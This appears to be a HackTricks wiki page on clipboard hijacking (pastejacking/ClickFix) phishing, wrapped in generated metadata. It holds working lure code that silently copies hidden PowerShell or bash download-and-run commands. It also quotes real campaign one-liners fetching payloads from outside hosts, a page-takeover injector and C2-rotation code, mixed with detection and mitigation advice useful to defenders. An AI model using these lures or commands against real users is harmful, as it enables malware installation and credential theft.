---
parsed_by: focuslocust
source: hacktricks
type: generated
---
# Clipboard Hijacking (Pastejacking) Attacks

[Home](../../../README.md)

## Provenance

| Field | Value |
| --- | --- |
| Source | `hacktricks` |
| Type | `hacktricks-topic` |
| Record ID | `hacktricks-generic-methodologies-and-resources-phishing-methodology-clipboard-hijacking` |
| Source file | `/home/adams/scorchederf/focuslocust/.cache/hacktricks/src/generic-methodologies-and-resources/phishing-methodology/clipboard-hijacking.md` |
| Parsed by | `focuslocust` |
| Relationship mode | `explicit / conservative inferred / manual` |

## Generated Concept Page

- [Clipboard Hijacking (Pastejacking) Attacks](../../topics/generic-methodologies-and-resources/clipboard-hijacking-pastejacking-attacks.md)

## Extracted Fields

| Field | Value |
| --- | --- |
| id | hacktricks-generic-methodologies-and-resources-phishing-methodology-clipboard-hijacking |
| name | Clipboard Hijacking (Pastejacking) Attacks |
| type | hacktricks-topic |
| source | hacktricks |
| url | https://github.com/HackTricks-wiki/hacktricks/blob/master/src/generic-methodologies-and-resources/phishing-methodology/clipboard-hijacking.md |

## Preserved Source Material

````yaml
_body: "# Clipboard Hijacking (Pastejacking) Attacks\n\n{{#include ../../banners/hacktricks-training.md}}\n\n> \"Never paste\
  \ anything you did not copy yourself.\" – old but still valid advice\n\n## Overview\n\nClipboard hijacking – also known\
  \ as *pastejacking* – abuses the fact that users routinely copy-and-paste commands without inspecting them. A malicious\
  \ web page (or any JavaScript-capable context such as an Electron or Desktop application) programmatically places attacker-controlled\
  \ text into the system clipboard. Victims are encouraged, normally by carefully crafted social-engineering instructions,\
  \ to press **Win + R** (Run dialog), **Win + X** (Quick Access / PowerShell), or open a terminal and *paste* the clipboard\
  \ content, immediately executing arbitrary commands.\n\nBecause **no file is downloaded and no attachment is opened**, the\
  \ technique bypasses most e-mail and web-content security controls that monitor attachments, macros or direct command execution.\
  \ The attack is therefore popular in phishing campaigns delivering commodity malware families such as NetSupport RAT, Latrodectus\
  \ loader or Lumma Stealer.\n\n## Forced copy buttons and hidden payloads (macOS one-liners)\n\nSome macOS infostealers clone\
  \ installer sites (e.g., Homebrew) and **force use of a “Copy” button** so users cannot highlight only the visible text.\
  \ The clipboard entry contains the expected installer command plus an appended Base64 payload (e.g., `...; echo <b64> |\
  \ base64 -d | sh`), so a single paste executes both while the UI hides the extra stage.\n\n## JavaScript Proof-of-Concept\n\
  \n```html\n<!-- Any user interaction (click) is enough to grant clipboard write permission in modern browsers -->\n<button\
  \ id=\"fix\" onclick=\"copyPayload()\">Fix the error</button>\n<script>\nfunction copyPayload() {\n  const payload = `powershell\
  \ -nop -w hidden -enc <BASE64-PS1>`; // hidden PowerShell one-liner\n  navigator.clipboard.writeText(payload)\n    .then(()\
  \ => alert('Now press  Win+R , paste and hit Enter to fix the problem.'));\n}\n</script>\n```\n\nOlder campaigns used `document.execCommand('copy')`,\
  \ newer ones rely on the asynchronous **Clipboard API** (`navigator.clipboard.writeText`).\n\n## The ClickFix / ClearFake\
  \ Flow\n\n1. User visits a typosquatted or compromised site (e.g. `docusign.sa[.]com`)\n2. Injected **ClearFake** JavaScript\
  \ calls an `unsecuredCopyToClipboard()` helper that silently stores a Base64-encoded PowerShell one-liner in the clipboard.\n\
  3. HTML instructions tell the victim to: *“Press **Win + R**, paste the command and press Enter to resolve the issue.”*\n\
  4. `powershell.exe` executes, downloading an archive that contains a legitimate executable plus a malicious DLL (classic\
  \ DLL sideloading).\n5. The loader decrypts additional stages, injects shellcode and installs persistence (e.g. scheduled\
  \ task) – ultimately running NetSupport RAT / Latrodectus / Lumma Stealer.\n\n### Example NetSupport RAT Chain\n\n```powershell\n\
  powershell -nop -w hidden -enc <Base64>\n# ↓ Decodes to:\nInvoke-WebRequest -Uri https://evil.site/f.zip -OutFile %TEMP%\\\
  f.zip ;\nExpand-Archive %TEMP%\\f.zip -DestinationPath %TEMP%\\f ;\n%TEMP%\\f\\jp2launcher.exe             # Sideloads msvcp140.dll\n\
  ```\n\n* `jp2launcher.exe` (legitimate Java WebStart) searches its directory for `msvcp140.dll`.\n* The malicious DLL dynamically\
  \ resolves APIs with **GetProcAddress**, downloads two binaries (`data_3.bin`, `data_4.bin`) via **curl.exe**, decrypts\
  \ them using a rolling XOR key `\"https://google.com/\"`, injects the final shellcode and unzips **client32.exe** (NetSupport\
  \ RAT) to `C:\\ProgramData\\SecurityCheck_v1\\`.\n\n### Latrodectus Loader\n\n```\npowershell -nop -enc <Base64>  # Cloud\
  \ Identificator: 2031\n```\n\n1. Downloads `la.txt` with **curl.exe**\n2. Executes the JScript downloader inside **cscript.exe**\n\
  3. Fetches an MSI payload → drops `libcef.dll` besides a signed application → DLL sideloading → shellcode → Latrodectus.\n\
  \n### Lumma Stealer via MSHTA\n\n```\nmshta https://iplogger.co/xxxx =+\\\\xxx\n```\n\nThe **mshta** call launches a hidden\
  \ PowerShell script that retrieves `PartyContinued.exe`, extracts `Boat.pst` (CAB), reconstructs `AutoIt3.exe` through `extrac32`\
  \ & file concatenation and finally runs an `.a3x` script which exfiltrates browser credentials to `sumeriavgv.digital`.\n\
  \n## ClickFix: Clipboard → PowerShell → JS eval → Startup LNK with rotating C2 (PureHVNC)\n\nSome ClickFix campaigns skip\
  \ file downloads entirely and instruct victims to paste a one‑liner that fetches and executes JavaScript via WSH, persists\
  \ it, and rotates C2 daily. Example observed chain:\n\n```powershell\npowershell -c \"$j=$env:TEMP+'\\a.js';sc $j 'a=new\
  \ \nActiveXObject(\\\"MSXML2.XMLHTTP\\\");a.open(\\\"GET\\\",\\\"63381ba/kcilc.ellrafdlucolc//:sptth\\\".split(\\\"\\\"\
  ).reverse().join(\\\"\\\"),0);a.send();eval(a.responseText);';wscript $j\" Prеss Entеr\n```\n\nKey traits\n- Obfuscated\
  \ URL reversed at runtime to defeat casual inspection.\n- JavaScript persists itself via a Startup LNK (WScript/CScript),\
  \ and selects the C2 by current day – enabling rapid domain rotation.\n\nMinimal JS fragment used to rotate C2s by date:\n\
  ```js\nfunction getURL() {\n    var C2_domain_list = ['stathub.quest','stategiq.quest','mktblend.monster','dsgnfwd.xyz','dndhub.xyz'];\n\
  \    var current_datetime = new Date().getTime();\n    var no_days = getDaysDiff(0, current_datetime);\n    return 'https://'\n\
  \        + getListElement(C2_domain_list, no_days)\n        + '/Y/?t=' + current_datetime\n        + '&v=5&p=' + encodeURIComponent(user_name\
  \ + '_' + pc_name + '_' + first_infection_datetime);\n}\n```\n\nNext stage commonly deploys a loader that establishes persistence\
  \ and pulls a RAT (e.g., PureHVNC), often pinning TLS to a hardcoded certificate and chunking traffic.\n\nDetection ideas\
  \ specific to this variant\n- Process tree: `explorer.exe` → `powershell.exe -c` → `wscript.exe <temp>\\a.js` (or `cscript.exe`).\n\
  - Startup artifacts: LNK in `%APPDATA%\\Microsoft\\Windows\\Start Menu\\Programs\\Startup` invoking WScript/CScript with\
  \ a JS path under `%TEMP%`/`%APPDATA%`.\n- Registry/RunMRU and command‑line telemetry containing `.split('').reverse().join('')`\
  \ or `eval(a.responseText)`.\n- Repeated `powershell -NoProfile -NonInteractive -Command -` with large stdin payloads to\
  \ feed long scripts without long command lines.\n- Scheduled Tasks that subsequently execute LOLBins such as `regsvr32 /s\
  \ /i:--type=renderer \"%APPDATA%\\Microsoft\\SystemCertificates\\<name>.dll\"` under an updater‑looking task/path (e.g.,\
  \ `\\GoogleSystem\\GoogleUpdater`).\n\nThreat hunting\n- Daily‑rotating C2 hostnames and URLs with `.../Y/?t=<epoch>&v=5&p=<encoded_user_pc_firstinfection>`\
  \ pattern.\n- Correlate clipboard write events followed by Win+R paste then immediate `powershell.exe` execution.\n\n\n\
  Blue-teams can combine clipboard, process-creation and registry telemetry to pinpoint pastejacking abuse:\n\n* Windows Registry:\
  \ `HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\RunMRU` keeps a history of **Win + R** commands – look\
  \ for unusual Base64 / obfuscated entries.\n* Security Event ID **4688** (Process Creation) where `ParentImage` == `explorer.exe`\
  \ and `NewProcessName` in { `powershell.exe`, `wscript.exe`, `mshta.exe`, `curl.exe`, `cmd.exe` }.\n* Event ID **4663**\
  \ for file creations under `%LocalAppData%\\Microsoft\\Windows\\WinX\\` or temporary folders right before the suspicious\
  \ 4688 event.\n* EDR clipboard sensors (if present) – correlate `Clipboard Write` followed immediately by a new PowerShell\
  \ process.\n\n## IUAM-style verification pages (ClickFix Generator): clipboard copy-to-console + OS-aware payloads\n\nRecent\
  \ campaigns mass-produce fake CDN/browser verification pages (\"Just a moment…\", IUAM-style) that coerce users into copying\
  \ OS-specific commands from their clipboard into native consoles. This pivots execution out of the browser sandbox and works\
  \ across Windows and macOS.\n\nKey traits of the builder-generated pages\n- OS detection via `navigator.userAgent` to tailor\
  \ payloads (Windows PowerShell/CMD vs. macOS Terminal). Optional decoys/no-ops for unsupported OS to maintain the illusion.\n\
  - Automatic clipboard-copy on benign UI actions (checkbox/Copy) while the visible text may differ from the clipboard content.\n\
  - Mobile blocking and a popover with step-by-step instructions: Windows → Win+R→paste→Enter; macOS → open Terminal→paste→Enter.\n\
  - Optional obfuscation and single-file injector to overwrite a compromised site’s DOM with a Tailwind-styled verification\
  \ UI (no new domain registration required).\n\nExample: clipboard mismatch + OS-aware branching\n```html\n<div class=\"\
  space-y-2\">\n  <label class=\"inline-flex items-center space-x-2\">\n    <input id=\"chk\" type=\"checkbox\" class=\"accent-blue-600\"\
  > <span>I am human</span>\n  </label>\n  <div id=\"tip\" class=\"text-xs text-gray-500\">If the copy fails, click the checkbox\
  \ again.</div>\n</div>\n<script>\nconst ua = navigator.userAgent;\nconst isWin = ua.includes('Windows');\nconst isMac =\
  \ /Mac|Macintosh|Mac OS X/.test(ua);\nconst psWin = `powershell -nop -w hidden -c \"iwr -useb https://example[.]com/cv.bat|iex\"\
  `;\nconst shMac = `nohup bash -lc 'curl -fsSL https://example[.]com/p | base64 -d | bash' >/dev/null 2>&1 &`;\nconst shown\
  \ = 'copy this: echo ok';            // benign-looking string on screen\nconst real = isWin ? psWin : (isMac ? shMac : 'echo\
  \ ok');\n\nfunction copyReal() {\n  // UI shows a harmless string, but clipboard gets the real command\n  navigator.clipboard.writeText(real).then(()=>{\n\
  \    document.getElementById('tip').textContent = 'Now press Win+R (or open Terminal on macOS), paste and hit Enter.';\n\
  \  });\n}\n\ndocument.getElementById('chk').addEventListener('click', copyReal);\n</script>\n```\n\nmacOS persistence of\
  \ the initial run\n- Use `nohup bash -lc '<fetch | base64 -d | bash>' >/dev/null 2>&1 &` so execution continues after the\
  \ terminal closes, reducing visible artifacts.\n\nIn-place page takeover on compromised sites\n```html\n<script>\n(async\
  \ () => {\n  const html = await (await fetch('https://attacker[.]tld/clickfix.html')).text();\n  document.documentElement.innerHTML\
  \ = html;                 // overwrite DOM\n  const s = document.createElement('script');\n  s.src = 'https://cdn.tailwindcss.com';\
  \                     // apply Tailwind styles\n  document.head.appendChild(s);\n})();\n</script>\n```\n\nDetection & hunting\
  \ ideas specific to IUAM-style lures\n- Web: Pages that bind Clipboard API to verification widgets; mismatch between displayed\
  \ text and clipboard payload; `navigator.userAgent` branching; Tailwind + single-page replace in suspicious contexts.\n\
  - Windows endpoint: `explorer.exe` → `powershell.exe`/`cmd.exe` shortly after a browser interaction; batch/MSI installers\
  \ executed from `%TEMP%`.\n- macOS endpoint: Terminal/iTerm spawning `bash`/`curl`/`base64 -d` with `nohup` near browser\
  \ events; background jobs surviving terminal close.\n- Correlate `RunMRU` Win+R history and clipboard writes with subsequent\
  \ console process creation.\n\nSee also for supporting techniques\n\n{{#ref}}\nclone-a-website.md\n{{#endref}}\n\n{{#ref}}\n\
  homograph-attacks.md\n{{#endref}}\n\n## 2026 fake CAPTCHA / ClickFix evolutions (ClearFake, Scarlet Goldfinch)\n\n- ClearFake\
  \ continues to compromise WordPress sites and inject loader JavaScript that chains external hosts (Cloudflare Workers, GitHub/jsDelivr)\
  \ and even blockchain “etherhiding” calls (e.g., POSTs to Binance Smart Chain API endpoints such as `bsc-testnet.drpc[.]org`)\
  \ to pull current lure logic. Recent overlays heavily use fake CAPTCHAs that instruct users to copy/paste a one-liner (T1204.004)\
  \ instead of downloading anything.\n- Initial execution is increasingly delegated to signed script hosts/LOLBAS. January\
  \ 2026 chains swapped earlier `mshta` usage for the built-in `SyncAppvPublishingServer.vbs` executed via `WScript.exe`,\
  \ passing PowerShell-like arguments with aliases/wildcards to fetch remote content:\n\n```cmd\n\"C:\\WINDOWS\\System32\\\
  WScript.exe\" \"C:\\WINDOWS\\system32\\SyncAppvPublishingServer.vbs\" \"n;&(gal i*x)(&(gcm *stM*) 'cdn.jsdelivr[.]net/gh/grading-chatter-dock73/vigilant-bucket-gui/p1lot')\"\
  \n```\n\n  - `SyncAppvPublishingServer.vbs` is signed and normally used by App-V; paired with `WScript.exe` and unusual\
  \ arguments (`gal`/`gcm` aliases, wildcarded cmdlets, jsDelivr URLs) it becomes a high-signal LOLBAS stage for ClearFake.\n\
  - February 2026 fake CAPTCHA payloads shifted back to pure PowerShell download cradles. Two live examples:\n\n```powershell\n\
  \"C:\\Windows\\system32\\WindowsPowerShell\\v1.0\\PowerShell.exe\" -c iex(irm 158.94.209[.]33 -UseBasicParsing)\n\"C:\\\
  Windows\\system32\\WindowsPowerShell\\v1.0\\PowerShell.exe\" -w h -c \"$w=New-Object -ComObject WinHttp.WinHttpRequest.5.1;$w.Open('GET','https[:]//cdn[.]jsdelivr[.]net/gh/www1day7/msdn/fase32',0);$w.Send();$f=$env:TEMP+'\\\
  FVL.ps1';$w.ResponseText>$f;powershell -w h -ep bypass -f $f\"\n```\n\n  - First chain is an in-memory `iex(irm ...)` grabber;\
  \ the second stages via `WinHttp.WinHttpRequest.5.1`, writes a temp `.ps1`, then launches with `-ep bypass` in a hidden\
  \ window.\n\nDetection/hunting tips for these variants\n- Process lineage: browser → `explorer.exe` → `wscript.exe ...SyncAppvPublishingServer.vbs`\
  \ or PowerShell cradles immediately after clipboard writes/Win+R.\n- Command-line keywords: `SyncAppvPublishingServer.vbs`,\
  \ `WinHttp.WinHttpRequest.5.1`, `-UseBasicParsing`, `%TEMP%\\FVL.ps1`, jsDelivr/GitHub/Cloudflare Worker domains, or raw\
  \ IP `iex(irm ...)` patterns.\n- Network: outbound to CDN worker hosts or blockchain RPC endpoints from script hosts/PowerShell\
  \ shortly after web browsing.\n- File/registry: temporary `.ps1` creation under `%TEMP%` plus RunMRU entries containing\
  \ these one-liners; block/alert on signed-script LOLBAS (WScript/cscript/mshta) executing with external URLs or obfuscated\
  \ alias strings.\n\n## Mitigations\n\n1. Browser hardening – disable clipboard write-access (`dom.events.asyncClipboard.clipboardItem`\
  \ etc.) or require user gesture.\n2. Security awareness – teach users to *type* sensitive commands or paste them into a\
  \ text editor first.\n3. PowerShell Constrained Language Mode / Execution Policy + Application Control to block arbitrary\
  \ one-liners.\n4. Network controls – block outbound requests to known pastejacking and malware C2 domains.\n\n## Related\
  \ Tricks\n\n* **Discord Invite Hijacking** often abuses the same ClickFix approach after luring users into a malicious server:\n\
  \  \n{{#ref}}\n  discord-invite-hijacking.md\n  {{#endref}}\n\n## References\n\n- [Fix the Click: Preventing the ClickFix\
  \ Attack Vector](https://unit42.paloaltonetworks.com/preventing-clickfix-attack-vector/)\n- [Pastejacking PoC – GitHub](https://github.com/dxa4481/Pastejacking)\n\
  - [Check Point Research – Under the Pure Curtain: From RAT to Builder to Coder](https://research.checkpoint.com/2025/under-the-pure-curtain-from-rat-to-builder-to-coder/)\n\
  - [The ClickFix Factory: First Exposure of IUAM ClickFix Generator](https://unit42.paloaltonetworks.com/clickfix-generator-first-of-its-kind/)\n\
  - [2025, the year of the Infostealer](https://www.pentestpartners.com/security-blog/2025-the-year-of-the-infostealer/)\n\
  - [Red Canary – Intelligence Insights: February 2026](https://redcanary.com/blog/threat-intelligence/intelligence-insights-february-2026/)\n\
  \n{{#include ../../banners/hacktricks-training.md}}"
_relative_path: generic-methodologies-and-resources/phishing-methodology/clipboard-hijacking.md
_source_path: /home/adams/scorchederf/focuslocust/.cache/hacktricks/src/generic-methodologies-and-resources/phishing-methodology/clipboard-hijacking.md
````
